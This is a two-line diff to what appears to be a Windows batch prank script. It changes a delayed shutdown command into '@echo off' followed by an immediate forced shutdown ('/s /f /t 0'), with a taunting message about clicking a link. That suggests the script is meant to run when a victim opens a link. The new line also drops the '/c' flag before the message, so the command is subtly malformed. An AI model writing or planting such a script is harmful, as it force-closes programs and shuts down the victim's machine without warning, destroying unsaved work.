@@ -1,1 +1,2 @@
-shutdown.exe -s -t 45 -c "HAH! Imagine clicking the link!"
+@echo off
+shutdown /s /f /t 0 "HAH! Imagine clicking the link!"
